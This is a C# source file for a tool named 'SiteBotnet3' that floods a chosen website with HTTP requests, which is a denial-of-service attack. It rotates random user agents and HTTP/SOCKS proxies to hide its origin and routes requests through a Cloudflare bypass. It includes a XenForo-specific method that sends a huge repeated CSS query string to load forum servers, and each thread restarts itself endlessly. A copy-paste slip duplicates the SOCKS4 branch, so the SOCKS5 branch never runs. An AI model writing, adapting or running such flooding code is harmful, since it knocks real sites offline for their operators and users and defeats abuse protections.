using System;
using System.Collections.Generic;
using Leaf.xNet;
using Leaf.xNet.Services.Cloudflare;
using System.Net.NetworkInformation;
using System.Threading;

namespace SiteBotnet3
{
    class Requests
    {
        private string ProxyType;
        private List<string> ProxyList;

        private string Method;
        private string Target;
        private int Threads;

        private int Hits;

        private Thread Thread;
        private string ThreadName;

        public Requests(string Name) { ThreadName = Name; }

        public void SetMethod(string Method) { this.Method = Method; }

        public void SetTarget(string Target) { this.Target = Target; }

        public void SetThreads(int Threads) { this.Threads = Threads; }

        public void SetProxyType(string ProxyType) { this.ProxyType = ProxyType; }

        public void SetProxyList(List<string> ProxyList) { if (!ProxyType.Equals("NONE")) this.ProxyList = ProxyList; }

        public void Start(bool showMsg)
        {
            if (showMsg) Console.WriteLine(ThreadName + " IS STARTING...");
            Thread = new Thread(BotnetWebsite) { Name = ThreadName };
            Thread.Start();
        }

        private void BotnetWebsite()
        {
            request: try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.UserAgent = Http.RandomUserAgent();
                    req.IgnoreProtocolErrors = true;
                    req.Cookies = new CookieStorage();

                    if (ProxyType == "HTTP")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = HttpProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using HTTP proxy : " + proxy);
                    }
                    else if (ProxyType == "SOCKS4")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = Socks4ProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using SOCKS4 proxy : " + proxy);
                    }
                    else if (ProxyType == "SOCKS4")
                    {
                        string proxy = ProxyList[new Random().Next(ProxyList.Count)];
                        req.Proxy = Socks5ProxyClient.Parse(proxy);
                        Console.WriteLine(ThreadName + " Using SOCKS5 proxy : " + proxy);
                    }
                    else if (ProxyType == "NONE")
                    {
                        req.Proxy = null;
                        req.KeepAlive = true;
                    }

                    Thread.Sleep(100);
                    Uri TargetUri = new Uri(Target);
                    HttpResponse respo = null;

                    if (Method == "XENFORO")
                    {
                        string xenForo = "?css=xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic,BRMS_ModernStatistic_dark,bb_code,xenforo,form,public,login_bar,notices,panel_scroller,moderator_bar,uix,uix_style,uix_dark,EXTRA,family,login_page,admin,BRMS_ModernStatistic";
                        respo = req.Get(TargetUri + xenForo);
                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri + xenForo);
                    }
                    else if (Method == "HTTP")
                    {
                        respo = req.Post(TargetUri);
                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri);

                        respo = req.Get(TargetUri);
                        if (respo.IsCloudflared()) respo = req.GetThroughCloudflare(TargetUri);
                    }

                    new Ping().Send(TargetUri.Host);

                    Hits += 1;
                    Console.WriteLine(ThreadName + " (" + Hits + " Hits) SUCCESS! | Target : " + Target + " | Threads : " + Threads);
                    Start(false);
                }
            }
            catch { goto request; }
        }
    }
}
